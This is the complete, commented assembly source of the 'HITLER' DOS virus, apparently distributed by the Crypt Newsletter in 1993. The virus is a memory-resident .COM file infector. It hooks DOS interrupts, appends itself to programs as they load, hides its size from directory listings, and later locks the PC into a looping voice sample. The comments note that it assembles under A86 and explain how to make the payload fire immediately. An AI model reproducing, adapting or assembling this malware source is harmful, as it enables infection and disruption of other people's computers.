;The HITLER virus: commented in a rough 'n' ready way by the 
;Crypt Newsletter staff for issue #11, January 1993.                
;The HITLER virus is a memory resident .COM infector which adds itself
;to the end of infected files. HITLER employs
;minimal directory stealth. 
;The minimal stealth allows the virus to subtract its file size from                
;infected targets when the user takes a look at them using "dir"
;functions while the virus is in memory.
;Most of HITLER's code is devoted to a huge data table which is a voice
;sample of some nut shouting "HITLER."  The virus ties the effect to
;the timer tick function, but if you want to hear it immediately, change the
;source were indicated. The resulting code will assemble under A86. On
;execution the virus will lock the PC into the voice effect until reboot,
;rendering it uninfective, if annoying.  Not all PC's can generate the
;HITLER sound effect - some will just buzz.


                call    rakett      ; recalculate offset
old             db 'Õ ê!≠'          ; virus identification marker
rakett:         pop     bp
                push    bp
                add     bp,-103h

                mov     ax,42ABh    ; check if virus installed
                int     21h
                jnc     failed      ; exit if here

                cli
                mov     ax,3521h
                int     21h                         ; get interrupt vector
                mov     w [bp+offset old21],bx      ; es:bx points to
                mov     w [bp+offset old21+2],es    ; interrupt handler

                mov     al,1Ch                      
                int     21h                         
                cli
                mov     w [bp+offset old1C],bx      ; access timer tick int.
                mov     w [bp+offset old1C+2],es
                mov     w [bp+offset teller],16380  ; stuff our value into
                sti                                 ; "teller" buffer for
                                                    ; later
                call    normalspeed                 ; eh?

                mov     si,ds
                std
                lodsb
                cld
                mov     ds,si

                xor     bx,bx
                mov     cx,pgf
                cmp     b [bx],'Z'
                jne     failed
                mov     ax,[bx+3]
                sub     ax,cx
                jc      failed
                mov     [bx+3],ax
                sub     [bx+12h],cx
                mov     es,[bx+12h]

                push    cs
                pop     ds

                mov     di,100h
                mov     si,bp
                add     si,di
                mov     cx,size
                rep     movsb

                push    es
                pop     ds
                mov     ax,2521h
                mov     dx,offset ni21     ; set int 21 route through virus
                int     21h
                mov     al,1Ch
                mov     dx,offset ni1C     ; revector timer tick through
                int     21h                ; virus

failed:         push    cs
                push    cs
                pop     ds
                pop     es

                pop     si
                mov     di,100h
                push    di
                movsw
                movsw
                movsb

                mov     cx,0FFh
                mov     si,100h
                ret                    ; exit to host


findFCB:        popf
                call    int21          ; look to virus "stealth" 
                pushf                  ; routine, now that int 21
                or      al,al          ; comes through virus
                jnz     backFCB
                call    stealth
backFCB:        popf
                iret

stealth:        push    ax          ; the following essentially massages the
                push    bx          ; file control block on directory scans,
                push    dx         ; subtracting the virus size from infected
                push    es          ; files before the user sees 'em

                mov     ah,2Fh       ; get disk transfer address
                call    int21        ; 

                cmp     byte es:[bx],0FFh ; failed? 
                jne     normFCB           ; no, everything still OK
                add     bx,8
normFCB:        mov     al,byte es:[bx+16h]  ; retrieve seconds attribute 
                and     al,31                ; from observed file, if it's
                xor     al,31                ; 31, the file is infected
                jnz     shitFCB              ; not 31 - file not infected
                mov     ax,word es:[bx+1Ch]
                mov     dx,word es:[bx+1Ch+2]
                sub     ax,size              ; subtract virus length from
                sbb     dx,0                 ; infected file
                jc      shitFCB              ; no files? exit
                mov     word es:[bx+1Ch],ax
                mov     word es:[bx+1Ch+2],dx
shitFCB:                                     ; restore everything as normal
                pop     es
                pop     dx
                pop     bx
                pop     ax
                ret

ni21:           pushf
                cmp     ah,11h    ; any user access of the file control
                je      findFCB   ; block must come through virus
                cmp     ah,12h    ; ditto for here
                je      findFCB

                cmp     ax,42ABh  ; 
                jne     not_42AB
                popf
                clc
                retf    2
not_42AB:
                cmp     ax,4B00h    ; is a program being loaded?
                jne     not_4B00    ; exit if not

                call    install_24  ; install critical error handler

                push    ax
                push    bx
                push    cx
                push    dx
                push    ds
                push    bp

                mov     ax,4300h     ; get file attributes of potential host
                call    int21
                jc      back1        ; failed? exit
                mov     cs:old_attr,cx   ; stash attributes here

                test    cl,4         ; is the potential host a system file?
                jnz     back1        ; yes? so exit

                mov     ax,4301h     ; set new file attributes, read or write
                xor     cx,cx
                call    int21
                jc      back1        ; error? exit

                push    dx
                push    ds
                call    infect       ; begin infection stuff
                pop     ds
                pop     dx

                mov     ax,4301h
db              0B9h    ;mov CX,...
old_attr        dw 0
                call    int21

back1:                             ;go here if the attrib-get fails
                pop     bp
                pop     ds
                pop     dx
                pop     cx
                pop     bx
                pop     ax

call    remove_24                 ; normalize critical error handler

not_4B00:
back:           popf
                db 0EAh
old21           dw 0,0

int21:          pushf
                call    dword ptr cs:old21
                ret

infect:         mov     ax,3D02h    ; open host file with read/write access
                call    int21
                jnc     okay_open
bad1:           ret                 ; was there an error? exit
okay_open:      xchg    bx,ax
                mov     ax,5700h    ; get file date and file time
                call    int21
                push    cx
                mov     bp,sp
                push    dx

                mov     ah,3Fh   ; read first five bytes from potential host
                mov     cx,5
                mov     dx,offset old ; store them here
                push    cs
                pop     ds
                call    int21
                jc      close     ; error, exit?
                cmp     al,5      ; get the five bytes?
                jne     close     ; no, so exit

                cmp     word old[0],'MZ'  ; is this an .EXE file?
                je      close             ; yes, so go away
                cmp     word old[0],'ZM' ; double-check, is this an .EXE file?
                je      close             ; yes, so go away
                cmp     old[0],0E9h       ; does it start with a jump?
                jne     infect1           ; no - infect!
                cmp     word old[3],'≠!'  ; does it start with the HITLER virus
                jne     infect1           ; marker? If no, infect!
                                          ; (Boy, this fellow is careful!)
close:          pop     dx
                pop     cx
                mov     ax,5701h         ; reset file date and time
                call    int21
                mov     ah,3Eh           ; close file
                call    int21
                ret

infect1:        mov     ax,4202h         ; reset pointer to end of file
                xor     cx,cx
                xor     dx,dx
                call    int21

                or      dx,dx
                jnz     close
                cmp     ax,59000       ; compare .COMfile size to 59,000 bytes
                jae     close          ; greater than or equal? close file
                               ; HITLER is a big virus, so we don't want to
                dec     ax     ; exceed the DOS execution boundary for .COM
                dec     ax     ; files
                dec     ax

                mov     word ptr putjmp[1],ax

                mov     ah,40h         ; write HITLER to the target file
                mov     cx,size        ; length in CX
                mov     dx,100h
                call    int21
                jc      close
                cmp     ax,size        ; again, we're being real careful
                jne     close          ; not to infect ourself

                mov     ax,4200h      ; set file pointer to beginning of host
                xor     cx,cx
                xor     dx,dx
                call    int21

                mov     ah,40h        ; write the first five bytes of the
                mov     cx,5          ; viral jump and ID strings to the
                mov     dx,offset putjmp ; beginning of the host file
                call    int21

                or      byte ss:[bp],31 ; set the seconds field to 31, so the
                                    ; "stealth" routine has its cue
                jmp     close        ; close the file and clean up

putjmp          db 0E9h
                dw 0
                db '!≠'

install_24:     pushf               ; installation of critical error
                cli                 ; handler (no shit, Sherlock!)
                push    bx
                push    ds
                xor     bx,bx
                mov     ds,bx
                push    ds
                lds     bx,[24h*4]
                mov     cs:old24[0],bx
                mov     cs:old24[2],ds
                pop     ds
                mov     word [(24h*4)],offset ni24
                mov     [(24h*4)+2],cs
                pop     ds
                pop     bx
                sti
                popf
                ret

remove_24:      pushf              ; remove it
                cli
                push    bx
                push    es
                push    ds
                xor     bx,bx
                mov     ds,bx
                les     bx,cs:old24[0]

                mov     [(24h*4)],bx
                mov     [(24h*4)+2],es

                pop     ds
                pop     es
                pop     bx
                sti
                popf
                ret

errflag         db 0

db 'Hitler Virus by Dreamer/DY',0       ; ID note by Dreamer of Demoralized
                                        ; Youth
ni24:           mov     al,3
                mov     cs:errflag,1
                iret

old24           dw      0,0

xofs            dw offset sample
len             equ 4131
divisor         equ 230
teller          dw 16380            ; "new" timer tick values for viral
                                    ; trigger
ni1C:
                cli
                pushf
                push    ax
                push    ds
                push    si

                push    cs
                pop     ds
               ; -lobotomize code from here to marker to get HITLER at start
                cmp     teller,0    ; compare 0 with the value the virus
                je      teller_ok   ; stuffed into the timer tick interrupt
                dec     teller      ; if equal - do "HITLER!" thing, if not
                jmp     noreset     ; decrement the value
               ; -bottom of lobotomy marker
teller_ok:                        ; sound routine to the IBM internal speaker
                mov     al,34h
                db      0E6h,43h        ;out 43h,al
                mov     al,divisor
                db      0E6h,40h        ;out 40h,al
                mov     al,0
                db      0E6h,40h        ;out 40h,al

                mov     al,090h
                db      0E6h,43h        ;out 43h,al
                mov     si,xofs
                lodsb
                db      0E6h,42h        ;out 42h,al

                db      0E4h,61h        ;in al,61h
                or      al,3
                db      0E6h,61h        ;out al,61h

                inc     xofs
                cmp     xofs,len+offset sample  ; points to the huge table at
                jb      noreset                 ; the end of the virus, a
                mov     xofs,offset sample      ; .VOC sample of some nut
noreset:                                        ; shouting "HITLER!"
                sti
                pop     si
                pop     ds
                pop     ax
                popf

                db      0EAh
old1C           dw      0,0

normalspeed:    cli
                push    ax
                mov     al,34h
                db      0E6h,43h
                mov     al,0
                db      0E6h,40h
                db      0E6h,40h
                pop     ax
                sti
                ret

sample:




        db 080h,080h,080h,080h,080h,081h,080h,081h,081h,081h,081h,081h,083h
        db 083h,083h,083h,083h,083h,083h,083h,083h,083h,081h,081h,081h,081h
        db 080h,080h,080h,080h,080h,080h,080h,080h,080h,080h,065h,000h,000h
        db 075h,08Ah,084h,083h,083h,089h,081h,081h,081h,07Ah,079h,07Ch,07Ah
        db 07Bh,07Ch,07Fh,07Ah,078h,079h,07Fh,07Bh,07Fh,07Dh,07Bh,07Ah,07Fh
        db 083h,08Ah,08Ch,088h,08Ah,085h,083h,089h,08Bh,080h,082h,07Fh,081h
        db 07Fh,082h,081h,08Bh,07Ah,074h,07Ch,07Eh,080h,07Fh,07Fh,083h,07Fh
        db 084h,082h,083h,080h,083h,081h,07Dh,07Eh,080h,083h,083h,07Dh,079h
        db 07Fh,084h,080h,07Bh,07Dh,07Fh,07Fh,07Ch,07Ah,07Dh,083h,081h,07Fh
        db 082h,080h,07Bh,07Fh,08Ah,08Bh,086h,085h,086h,083h,089h,089h,086h
        db 084h,07Dh,07Ch,07Eh,085h,086h,085h,086h,083h,081h,088h,087h,080h
        db 07Dh,081h,083h,081h,080h,07Ch,07Eh,076h,075h,07Bh,07Ah,075h,072h
        db 075h,06Fh,074h,07Eh,080h,07Fh,07Fh,07Fh,083h,087h,085h,084h,08Ah
        db 08Bh,086h,087h,08Ah,08Ah,08Ah,081h,081h,089h,084h,081h,07Ch,086h
        db 083h,084h,082h,07Fh,082h,07Fh,087h,086h,082h,080h,076h,07Ch,07Bh
        db 07Bh,082h,07Dh,07Eh,07Ah,07Fh,07Eh,085h,084h,082h,084h,07Eh,088h
        db 07Fh,088h,07Eh,07Fh,07Dh,077h,07Ch,075h,07Dh,078h,07Bh,079h,07Fh
        db 080h,084h,088h,081h,083h,087h,084h,087h,082h,089h,08Bh,08Fh,08Dh
        db 08Bh,087h,080h,083h,081h,08Ch,07Ah,082h,076h,07Fh,07Bh,07Ah,07Ah
        db 07Ch,077h,072h,077h,07Ch,07Fh,080h,07Eh,07Bh,07Dh,07Ah,080h,07Ch
        db 07Eh,076h,082h,082h,08Dh,089h,084h,085h,085h,086h,087h,089h,086h
        db 085h,08Ch,087h,090h,085h,07Ch,082h,083h,087h,07Ch,088h,07Bh,074h
        db 091h,085h,09Bh,086h,086h,070h,076h,079h,08Dh,080h,06Bh,063h,069h
        db 07Dh,067h,04Ch,081h,07Ah,0ABh,0A8h,09Ch,08Eh,060h,056h,07Fh,088h
        db 089h,075h,094h,08Ch,013h,092h,040h,0D7h,0B0h,097h,0C4h,036h,057h
        db 082h,0CBh,0C5h,09Dh,0C8h,00Dh,0A5h,026h,0A7h,072h,06Bh,0E0h,032h
        db 089h,07Ah,0A7h,0E4h,0D7h,048h,07Fh,034h,07Bh,054h,06Fh,0B6h,02Bh
        db 06Ah,055h,0ABh,0C0h,032h,09Fh,074h,06Fh,0A4h,043h,0B6h,040h,087h
        db 090h,095h,0FFh,060h,015h,074h,039h,0E0h,044h,0D7h,080h,027h,0C9h
        db 070h,0E7h,0F8h,025h,0AEh,009h,0ABh,050h,067h,0ACh,01Ch,0E3h,068h
        db 09Fh,0FFh,02Fh,0CEh,014h,09Fh,080h,023h,0C4h,056h,0D3h,075h,0AFh
        db 0F4h,035h,0A8h,000h,077h,040h,000h,09Ch,05Bh,0BBh,078h,0EBh,0D4h
        db 07Fh,0A8h,007h,0BDh,032h,04Dh,092h,087h,0D4h,08Dh,0FFh,070h,0D7h
        db 04Ch,06Bh,08Ch,01Ah,08Fh,078h,092h,087h,0CFh,0E8h,06Fh,0A0h,000h
        db 0A5h,01Ch,007h,069h,073h,0B0h,07Fh,0FFh,068h,0D1h,028h,067h,070h
        db 009h,09Bh,05Ch,0BFh,06Ch,0DFh,0A0h,09Fh,080h,01Bh,0A0h,020h,077h
        db 082h,08Bh,0A8h,0A7h,0F0h,077h,0C8h,011h,0BAh,044h,033h,0B0h,069h
        db 0B2h,08Eh,0FFh,068h,0DAh,018h,06Fh,060h,00Dh,0BAh,053h,0AFh,06Eh
        db 0D7h,0B0h,07Fh,080h,00Ah,0B2h,020h,055h,080h,05Dh,098h,09Bh,0C0h
        db 07Fh,094h,009h,0AFh,032h,05Bh,080h,05Ah,093h,093h,0FFh,071h,0DCh
        db 030h,07Fh,080h,01Fh,0BBh,074h,0F2h,079h,0E7h,074h,0DFh,050h,03Fh
        db 0A2h,02Ch,0B7h,070h,06Dh,072h,0AFh,0F0h,05Ah,0A2h,000h,095h,032h
        db 01Fh,094h,06Bh,0E0h,054h,0F6h,059h,0E3h,048h,05Fh,0A0h,033h,0BFh
        db 074h,073h,070h,0E7h,0A0h,06Bh,074h,000h,0A1h,024h,027h,065h,08Dh
        db 097h,0BBh,0FFh,06Ah,0E2h,04Ah,07Fh,084h,003h,087h,04Fh,0CDh,075h
        db 0E5h,0B8h,09Dh,0A8h,019h,0C2h,048h,047h,0A0h,05Ch,071h,077h,0FFh
        db 068h,06Bh,074h,00Fh,0BBh,010h,077h,048h,087h,0A4h,087h,0FCh,07Dh
        db 0F0h,040h,0C7h,082h,047h,0B8h,04Ah,099h,05Eh,0DBh,082h,087h,058h
        db 000h,098h,020h,06Fh,072h,06Fh,0A8h,083h,0FFh,059h,0E5h,052h,067h
        db 0AAh,028h,0B9h,03Fh,0C6h,05Ch,0AFh,0C0h,087h,0A0h,00Eh,0BBh,04Ah
        db 08Fh,080h,03Fh,078h,064h,0FFh,068h,093h,068h,01Fh,0B6h,020h,092h
        db 04Bh,0B7h,08Ah,095h,0D8h,08Bh,0C0h,021h,0C7h,06Ah,07Fh,09Ch,067h
        db 085h,04Eh,0FFh,070h,09Fh,050h,000h,0ADh,021h,08Fh,058h,0BFh,084h
        db 075h,0E0h,06Fh,0D0h,014h,0ABh,074h,077h,0B8h,046h,096h,056h,0EFh
        db 098h,07Fh,098h,000h,0A3h,038h,05Fh,070h,06Fh,0A4h,04Bh,0E4h,054h
        db 0D9h,040h,06Fh,098h,05Dh,0C2h,051h,095h,054h,095h,0DCh,06Fh,0B8h
        db 000h,06Fh,068h,03Fh,0A0h,057h,0E0h,049h,0DDh,084h,0C7h,074h,025h
        db 0D8h,05Bh,0E6h,04Ch,08Fh,068h,03Fh,0E8h,04Ah,0CFh,032h,033h,0A0h
        db 039h,0C2h,040h,0D7h,05Ch,09Bh,0A0h,087h,098h,029h,0D5h,070h,09Fh
        db 082h,07Bh,084h,03Dh,0D5h,068h,0BDh,02Ch,01Bh,0A8h,040h,0BDh,054h
        db 0B3h,062h,04Fh,0D6h,064h,0D4h,039h,05Fh,098h,06Fh,0C8h,03Ah,0B1h
        db 04Eh,06Fh,0A4h,07Fh,0AAh,011h,097h,06Ah,09Bh,094h,049h,0C0h,045h
        db 0AFh,080h,09Dh,098h,022h,0BFh,062h,0BDh,065h,047h,0B0h,040h,0BFh
        db 070h,0ADh,070h,01Dh,0C9h,067h,089h,06Ch,07Fh,0D0h,060h,0BFh,072h
        db 09Bh,080h,000h,08Dh,052h,0ABh,064h,055h,0DAh,078h,0CBh,0A8h,0AFh
        db 080h,016h,09Fh,062h,0AFh,04Ch,03Dh,0C0h,062h,05Fh,0C8h,05Bh,0CEh
        db 024h,01Bh,084h,06Bh,08Ch,060h,0BFh,0A4h,09Dh,0FFh,060h,0BCh,01Ah
        db 000h,0B0h,066h,0CCh,054h,073h,0D8h,085h,09Bh,0C8h,055h,0C2h,020h
        db 001h,072h,056h,069h,07Ch,0AAh,0A8h,07Bh,0AFh,080h,087h,090h,018h
        db 065h,071h,065h,0C2h,095h,0DAh,0B1h,09Ch,0C5h,08Ah,07Bh,080h,03Dh
        db 044h,051h,05Fh,06Ah,075h,089h,07Eh,082h,083h,080h,06Eh,064h,062h
        db 066h,075h,083h,08Bh,0A2h,0A6h,0A9h,0BAh,08Bh,091h,076h,07Bh,07Eh
        db 069h,07Bh,064h,06Dh,080h,075h,079h,06Ah,077h,07Ah,071h,078h,06Fh
        db 082h,07Ah,083h,090h,088h,07Ch,07Dh,088h,085h,089h,08Ah,085h,083h
        db 091h,086h,089h,085h,079h,07Fh,07Bh,083h,07Eh,077h,078h,083h,07Fh
        db 082h,08Bh,076h,079h,075h,07Fh,090h,074h,079h,075h,077h,072h,085h
        db 084h,076h,07Eh,074h,07Dh,07Eh,07Ah,080h,080h,07Fh,077h,07Eh,07Ah
        db 080h,080h,07Fh,088h,07Ch,084h,07Fh,07Fh,080h,081h,07Eh,079h,08Ah
        db 087h,086h,083h,08Dh,086h,07Ch,08Ch,07Ah,07Bh,073h,087h,098h,082h
        db 083h,07Dh,083h,07Ch,075h,083h,06Dh,077h,073h,085h,085h,072h,07Ch
        db 077h,082h,07Ah,07Ch,075h,06Bh,06Ch,073h,082h,073h,075h,07Eh,074h
        db 081h,087h,08Dh,088h,080h,075h,07Fh,08Dh,083h,097h,084h,081h,083h
        db 085h,080h,078h,07Dh,078h,07Fh,082h,087h,08Ch,078h,082h,081h,086h
        db 082h,07Dh,081h,07Bh,074h,078h,084h,078h,084h,080h,07Eh,079h,075h
        db 079h,072h,081h,07Dh,08Bh,07Eh,07Bh,086h,082h,086h,07Fh,07Eh,077h
        db 076h,084h,07Eh,080h,074h,077h,07Fh,090h,08Ch,085h,07Ah,062h,06Ah
        db 080h,08Ch,08Dh,07Eh,072h,07Bh,082h,089h,095h,08Ah,06Fh,07Ah,083h
        db 082h,083h,07Bh,077h,07Ah,079h,082h,07Dh,06Eh,077h,06Eh,082h,07Eh
        db 088h,07Dh,07Fh,078h,071h,081h,075h,07Ch,086h,07Fh,086h,07Eh,085h
        db 081h,086h,087h,08Dh,08Ah,076h,07Ah,07Ah,086h,085h,08Ah,086h,085h
        db 07Dh,077h,078h,06Eh,07Fh,07Ah,07Dh,07Eh,074h,083h,079h,088h,07Ah
        db 084h,078h,073h,081h,079h,086h,083h,081h,07Fh,082h,094h,080h,080h
        db 06Eh,069h,07Ch,078h,07Eh,07Bh,07Ch,072h,086h,090h,086h,07Dh,079h
        db 07Eh,084h,08Bh,07Eh,080h,080h,072h,090h,088h,07Ch,079h,076h,07Bh
        db 07Fh,086h,07Ah,081h,07Dh,07Dh,08Ah,07Ah,080h,070h,075h,07Eh,079h
        db 085h,073h,076h,075h,087h,087h,088h,084h,07Ch,07Ah,076h,077h,07Bh
        db 079h,083h,07Bh,081h,07Dh,07Ch,07Fh,080h,081h,07Fh,08Ah,082h,082h
        db 08Ch,082h,086h,086h,08Ah,083h,080h,071h,073h,07Fh,077h,084h,087h
        db 081h,07Bh,07Fh,07Fh,087h,086h,079h,083h,077h,087h,07Ch,07Ch,07Ch
        db 075h,082h,071h,076h,07Ch,076h,079h,079h,082h,070h,080h,07Ah,081h
        db 087h,084h,07Ah,070h,07Dh,06Fh,082h,084h,07Eh,081h,07Bh,07Dh,07Fh
        db 08Fh,07Dh,07Ch,084h,07Eh,07Bh,086h,088h,07Eh,08Fh,089h,075h,08Ah
        db 07Dh,079h,07Dh,080h,079h,07Fh,086h,077h,078h,07Dh,06Eh,08Dh,07Fh
        db 074h,076h,07Eh,078h,078h,08Dh,079h,07Eh,082h,07Eh,080h,087h,079h
        db 076h,082h,074h,07Eh,081h,06Eh,074h,081h,082h,081h,092h,07Bh,07Fh
        db 08Fh,08Ah,08Bh,07Ch,070h,074h,08Fh,07Eh,084h,084h,06Fh,075h,07Ah
        db 08Eh,07Bh,07Ch,078h,078h,083h,086h,08Eh,07Eh,082h,070h,07Dh,08Dh
        db 078h,07Bh,06Fh,077h,076h,087h,085h,074h,079h,077h,07Dh,085h,084h
        db 06Bh,07Eh,07Eh,077h,086h,088h,079h,07Dh,091h,07Bh,081h,09Bh,073h
        db 080h,07Bh,07Bh,090h,084h,070h,07Bh,08Ah,078h,07Fh,081h,071h,07Fh
        db 082h,080h,074h,081h,07Bh,06Dh,07Fh,070h,078h,089h,07Ch,077h,089h
        db 08Ah,07Fh,086h,07Eh,072h,081h,073h,068h,07Fh,082h,073h,085h,08Ah
        db 086h,09Eh,093h,07Bh,081h,086h,069h,07Dh,086h,06Ch,07Fh,088h,088h
        db 08Fh,09Ch,08Ch,079h,086h,074h,067h,06Dh,064h,069h,077h,07Fh,084h
        db 09Fh,085h,08Dh,09Bh,074h,071h,06Ch,05Dh,062h,07Dh,06Dh,073h,086h
        db 090h,091h,097h,092h,07Ah,079h,07Ch,061h,06Dh,076h,073h,070h,088h
        db 090h,094h,09Bh,09Bh,094h,078h,077h,078h,060h,05Dh,069h,07Bh,087h
        db 090h,09Fh,09Dh,09Fh,0A1h,080h,076h,068h,053h,04Bh,066h,072h,072h
        db 086h,099h,097h,0A2h,0ADh,082h,06Ah,064h,05Ah,053h,061h,06Ah,067h
        db 08Ah,0ABh,0ADh,0ACh,09Bh,0A5h,060h,067h,066h,059h,056h,06Fh,093h
        db 08Fh,0BFh,0A8h,08Eh,0AFh,0AAh,044h,04Fh,070h,041h,057h,08Dh,084h
        db 07Dh,0D1h,094h,07Eh,0BEh,088h,02Dh,06Ah,070h,038h,07Bh,0ABh,063h
        db 0AFh,0A0h,068h,075h,0CDh,064h,013h,087h,068h,02Fh,0ABh,0B4h,037h
        db 097h,0E0h,050h,097h,0F8h,022h,063h,0D4h,02Ah,07Dh,0E6h,038h,02Fh
        db 0F9h,080h,047h,0E7h,0DAh,010h,07Fh,084h,034h,0B7h,0B0h,01Dh,035h
        db 0D7h,0C0h,04Fh,0A1h,0B2h,002h,06Fh,0DEh,014h,087h,040h,001h,077h
        db 0FFh,0A0h,032h,0BDh,0E2h,05Bh,0D7h,0C0h,000h,095h,02Ah,000h,0A7h
        db 0C8h,02Ch,057h,0AEh,0C4h,09Fh,0E2h,030h,03Bh,0DCh,04Ah,02Fh,0FCh
        db 084h,03Ah,0A5h,0D3h,094h,0BBh,0D8h,020h,07Fh,0A0h,018h,033h,0FFh
        db 06Ch,009h,0A7h,0E2h,03Ah,0AFh,08Ah,000h,087h,068h,020h,09Fh,0D0h
        db 040h,05Bh,0FFh,088h,03Fh,0D5h,01Ch,027h,0A0h,036h,04Fh,0FFh,0A8h
        db 042h,0EFh,0D0h,05Eh,0F3h,0A0h,000h,05Bh,045h,03Dh,0F5h,0B4h,01Eh
        db 057h,0FFh,060h,087h,0DCh,000h,007h,084h,04Ch,07Dh,0FFh,071h,02Dh
        db 0FFh,0C4h,037h,0CFh,064h,000h,06Fh,038h,03Dh,0FFh,0C0h,034h,09Bh
        db 0FFh,054h,0A3h,0C2h,000h,05Fh,050h,01Ah,09Fh,0FFh,050h,03Fh,0FFh
        db 08Ch,073h,0F7h,034h,000h,07Ah,048h,073h,0FFh,080h,029h,0EFh,0D8h
        db 02Eh,0ABh,068h,000h,08Dh,036h,028h,0F3h,0D8h,044h,08Fh,0FFh,04Ah
        db 0AFh,0DAh,000h,02Bh,030h,03Fh,0D3h,0E8h,05Ah,07Fh,0FFh,068h,097h
        db 0E2h,000h,00Bh,021h,03Fh,0A7h,0FFh,06Ch,063h,0FFh,078h,073h,0DFh
        db 050h,000h,000h,04Dh,09Fh,0FFh,082h,033h,0E7h,0C0h,059h,0AFh,098h
        db 000h,02Bh,03Fh,062h,0F1h,0A6h,073h,0DFh,0FFh,040h,08Bh,0D0h,000h
        db 000h,017h,05Fh,0FDh,0FFh,058h,08Fh,0FFh,06Dh,0B7h,0ECh,008h,000h
        db 027h,07Bh,0C6h,0D2h,075h,097h,0FFh,060h,076h,0C8h,018h,000h,000h
        db 065h,0AFh,0FFh,096h,073h,0FFh,088h,07Fh,0DAh,040h,000h,000h,07Bh
        db 09Fh,0E0h,082h,069h,0FFh,0D4h,05Fh,066h,080h,000h,027h,049h,062h
        db 09Dh,0AAh,099h,0FFh,0F8h,038h,096h,0D4h,000h,000h,027h,077h,0FFh
        db 0FCh,068h,09Fh,0FFh,065h,0AFh,0D8h,000h,000h,02Fh,09Ah,07Fh,088h
        db 06Dh,0CFh,0FFh,062h,06Dh,0B1h,028h,000h,019h,065h,0BFh,0F4h,062h
        db 08Bh,0FFh,084h,077h,0EBh,054h,000h,000h,05Dh,0AFh,0FFh,08Ah,057h
        db 0FFh,068h,069h,0ABh,084h,000h,000h,065h,099h,0FFh,09Ch,05Bh,0EFh
        db 0E4h,09Dh,093h,09Ah,000h,000h,07Fh,093h,08Eh,089h,06Ch,0E5h,0FFh
        db 05Dh,074h,0CFh,038h,000h,023h,079h,09Bh,0DEh,091h,0AFh,0FFh,05Ch
        db 073h,0A7h,084h,000h,000h,046h,09Fh,0FFh,080h,053h,0DFh,0E4h,077h
        db 08Ah,0B8h,000h,000h,06Bh,089h,0A4h,084h,085h,0BFh,0FFh,050h,02Bh
        db 0C7h,068h,000h,00Fh,055h,0B5h,0FFh,0D0h,014h,0CFh,084h,059h,0DDh
        db 0C0h,000h,000h,08Fh,0B6h,0CBh,09Ah,050h,0D7h,0FFh,026h,055h,0A2h
        db 008h,000h,03Bh,06Ch,08Ah,0D3h,094h,083h,0FFh,082h,091h,0E7h,060h
        db 000h,00Ch,095h,082h,09Ch,0B3h,07Ah,0E7h,0FEh,028h,059h,0D7h,058h
        db 000h,001h,03Fh,0BFh,0FFh,078h,063h,0FFh,086h,0B3h,0FFh,040h,000h
        db 000h,06Dh,08Fh,0D9h,0A1h,060h,0B3h,0D2h,0C7h,074h,048h,000h,045h
        db 04Bh,03Bh,097h,0B8h,0A2h,0D3h,0FFh,064h,071h,0CEh,004h,00Bh,01Bh
        db 052h,07Bh,0C1h,0F6h,0A4h,0C5h,0C0h,065h,072h,0C6h,000h,000h,00Ah
        db 03Fh,0DFh,0FFh,058h,06Bh,0FAh,044h,0A7h,0FFh,028h,000h,03Bh,0BDh
        db 0FAh,0FFh,088h,07Bh,0FFh,058h,062h,057h,060h,000h,000h,043h,08Bh
        db 0FFh,098h,06Ah,0E7h,0D0h,062h,08Ah,0B0h,000h,005h,05Fh,0B5h,0B2h
        db 0A4h,072h,0D7h,0FFh,038h,087h,088h,01Ch,027h,053h,06Ah,09Dh,0FFh
        db 070h,075h,0FDh,048h,063h,0C5h,080h,000h,015h,06Bh,0B7h,0FFh,084h
        db 048h,0A7h,0E0h,061h,0B3h,088h,000h,031h,03Eh,062h,09Bh,0ECh,058h
        db 05Bh,0FFh,054h,06Bh,0B5h,0A0h,000h,000h,061h,091h,0FFh,090h,043h
        db 0EFh,0B8h,09Ah,09Fh,0A8h,000h,027h,031h,05Bh,09Ch,0BAh,0B0h,0BFh
        db 0F5h,04Ah,07Fh,0E5h,042h,000h,000h,056h,0BBh,0FFh,090h,03Fh,0FFh
        db 090h,0BFh,0D7h,094h,000h,000h,05Fh,08Eh,0FFh,080h,04Eh,0A5h,0D8h
        db 07Fh,064h,094h,000h,000h,03Bh,088h,074h,068h,0BFh,0FBh,0FFh,04Ah
        db 05Fh,0A5h,092h,015h,000h,01Fh,07Bh,0FFh,0FFh,052h,0DFh,050h,09Fh
        db 0D3h,0C0h,000h,000h,053h,08Dh,0FFh,098h,036h,087h,0D4h,08Bh,06Dh
        db 0B4h,000h,000h,035h,07Dh,0CBh,0F8h,0BAh,074h,0FFh,078h,075h,09Ah
        db 050h,000h,000h,0AEh,082h,073h,0A6h,0B0h,0FFh,0C8h,03Bh,052h,099h
        db 032h,000h,023h,044h,07Fh,0FFh,0FFh,058h,087h,046h,07Bh,0F3h,0CAh
        db 000h,000h,05Fh,0CAh,0FFh,0FEh,024h,077h,0B8h,039h,076h,0B4h,00Eh
        db 000h,02Bh,08Eh,0ABh,0FFh,070h,063h,0FFh,080h,09Ch,0BBh,054h,000h
        db 00Fh,06Ah,0A5h,0D6h,09Ah,099h,0DDh,0D4h,056h,067h,094h,000h,000h
        db 01Dh,066h,0BBh,0FFh,070h,067h,0D0h,06Fh,096h,0DEh,048h,000h,036h
        db 06Fh,09Ah,0FFh,070h,027h,0C9h,056h,06Ch,08Fh,084h,000h,023h,057h
        db 086h,0FFh,0F4h,080h,04Fh,0F5h,06Eh,082h,0C9h,020h,000h,003h,05Bh
        db 099h,0FFh,0C0h,03Ch,0EBh,080h,08Fh,09Dh,0A8h,006h,00Eh,056h,077h
        db 0DFh,0FFh,060h,07Fh,0B0h,06Eh,062h,0CEh,01Ah,017h,047h,05Dh,085h
        db 0FFh,0FFh,040h,097h,05Ah,05Eh,06Fh,0B4h,000h,037h,050h,07Fh,0ABh
        db 0FFh,0D8h,000h,0A7h,040h,047h,07Fh,08Ch,01Ch,023h,06Dh,080h,0C7h
        db 0FFh,080h,019h,0D2h,030h,056h,09Fh,070h,018h,02Dh,086h,0A8h,0FFh
        db 0FFh,070h,08Fh,0A0h,03Ch,018h,09Fh,070h,00Ah,053h,095h,099h,0FFh
        db 0FFh,044h,08Bh,088h,02Dh,00Fh,0ADh,044h,006h,067h,0A2h,085h,0EBh
        db 0FFh,030h,04Fh,094h,013h,000h,0BBh,035h,037h,083h,08Ch,093h,0FFh
        db 0FFh,040h,06Dh,0A8h,023h,027h,0AFh,034h,047h,072h,092h,07Fh,0EBh
        db 0FFh,054h,04Bh,0C0h,039h,044h,09Dh,054h,055h,075h,0C6h,084h,096h
        db 0FFh,0A0h,033h,0BFh,04Ch,02Ch,056h,08Ah,055h,087h,0B3h,062h,051h
